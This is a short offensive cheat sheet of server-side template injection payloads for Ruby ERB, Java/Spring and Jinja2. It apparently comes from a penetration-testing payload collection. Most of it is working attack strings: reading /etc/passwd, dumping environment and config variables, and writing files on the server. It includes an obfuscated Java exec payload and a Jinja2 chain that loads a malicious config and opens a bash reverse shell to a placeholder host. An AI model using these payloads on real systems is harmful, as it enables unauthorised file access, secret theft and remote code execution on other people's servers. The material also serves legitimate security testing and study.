# Templates Injections

Template injection allows an attacker to include template code into an existant (or not) template.

## Ruby
#### Basic injection
```python
<%= 7 * 7 %>
```

#### Retrieve /etc/passwd
```python
<%= File.open('/etc/passwd').read %>
```


## Java
#### Basic injection
```java
${{7*7}}
```

#### Retrieve the system’s environment variables.
```java
${T(java.lang.System).getenv()}
```

#### Retrieve /etc/passwd
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Jinja2
[Official website](http://jinja.pocoo.org/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.

#### Basic injection
```python
{{4*4}}[[5*5]]
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on Flask application.
#### Template format
```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

#### Dump all used classes
```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

#### Dump all config variables
```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

#### Read remote file
```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### Write into remote file
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

#### Remote Code Execution via reverse shell
Listen for connexion
```
nv -lnvp 8000
```
Inject this template
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
```

## Thanks to
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
 * [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
 * [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
#### Training
[https://w3challs.com/](https://w3challs.com/)
